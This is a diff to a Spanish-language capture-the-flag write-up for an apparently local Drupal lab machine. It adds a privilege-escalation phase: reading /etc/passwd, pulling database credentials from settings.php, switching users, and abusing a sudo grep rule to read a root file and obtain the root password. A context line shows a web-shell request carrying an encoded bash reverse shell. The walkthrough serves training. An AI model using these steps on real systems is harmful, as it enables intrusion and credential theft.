@@ -77,7 +77,7 @@ drupalgedón...suena a muerte y destrucción del CMS drupal.
 
 3-pegar en el nano con "ctrl"+shift (la tecla de encima del ctrl izq con una flecha hacia arriba)+V
 
-4-Guardar ctrl+V
+4-Guardar ctrl+O
 
 5-Salir ctrl+X
 
@@ -144,6 +144,129 @@ http://172.17.0.2/drupal/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%
 ```
 
 y estamos dentro!!!
+
+
+## FASE ESCALADA DE PRIVILEGIOS
+
+Miramos con "id" si estamos en algún grupo priviegiado:
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+nada
+
+un cat al /etc/passwd para ver los usuarios:
+
+ ```bash
+cat /etc/passwd | grep sh$
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
+```
+
+con "sudo -l" nos pide contraseña que no tenemos
+
+En drupal suelen guardarse algunas credenciales en un archivo llamado "settings.php"
+lo buscamos:
+
+```bash
+find / -type f -name settings.php 2>/dev/null
+```
+```
+/var/www/html/drupal/sites/default/settings.php
+```
+
+ya lo localizamos, vamos a ver que permisos tiene:
+```
+ls -la /var/www/html/drupal/sites/default/settings.php
+-r--r--r-- 1 www-data www-data 32133 Oct 16  2024 /var/www/html/drupal/sites/default/settings.php
+```
+
+podemos leerlo, vamos a hacer una búsqueda rápida:
+
+```bash
+cat settings.php | grep -A 10 'databases'
+```
+
+en algún sitio podemos leer:
+
+```
+* @code
+ * $databases['default']['default'] = array (
+ *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
+ *   'username' => 'ballenita',
+ *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
+ *   'host' => 'localhost',
+ *   'port' => '3306',
+ *   'driver' => 'mysql',
+ *   'prefix' => '',
+ *   'collation' => 'utf8mb4_general_ci',
+ * );
+ * @endcode
+--
+$databases = array();
+```
+
+usuario:ballenita
+password:ballenitafeliz
+Además ese comentario de "Cuidadito cuidadín pillin" me da buena vibra xD
+
+intentamos pivotar al user ballenita:
+```
+su ballenita
+```
+metemos el password--->ballenitafeliz
+
+y ya somos ballenita¡¡¡¡
+
+
+Hacemos un sudo -l:
+
+```bash
+sudo -l
+```
+
+```
+(root) NOPASSWD: /bin/ls, /bin/grep
+```
+
+
+pudiendo listar con ls siendo root todo el sistema:
+```bash
+sudo -u root /bin/ls /root
+```
+```
+secretitomaximo.txt
+```
+y con grep, vamos a 
+```bash
+https://gtfobins.github.io/gtfobins/grep/#sudo
+```
+```
+LFILE=file_to_read
+sudo grep '' $LFILE
+```
+
+pues al lio, en vez de guardar la ruta al file lo meto directo:
+
+```bash
+sudo -u root /bin/grep '' /root/secretitomaximo.txt
+```
+```
+nobodycanfindthispasswordrootrocks
+```
+
+veamos si es el password de root:
+
+```bash
+su root
+```
+introducimos el password:nobodycanfindthispasswordrootrocks
+
+Ya somos root¡¡¡¡
+
+
 
 
 
